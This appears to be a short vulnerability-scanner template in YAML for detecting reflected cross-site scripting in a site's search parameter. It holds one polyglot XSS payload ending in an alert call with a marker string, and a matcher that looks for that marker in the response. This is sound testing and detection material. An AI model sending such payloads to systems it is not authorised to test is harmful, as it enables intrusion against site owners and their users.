id: xss2-258
name: 'Reflected XSS2 ctx-17 via search'
severity: high
type: active
tags:
  - xss
  - injection
  - client
description: 'Unencoded reflection in search'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      search:
        - 'jaVasCript:/*-/*`/*\`/*''/*"/**/alert(nx2257)//'
    matchers:
      - type: word
        part: body
        words:
          - 'nx2257'
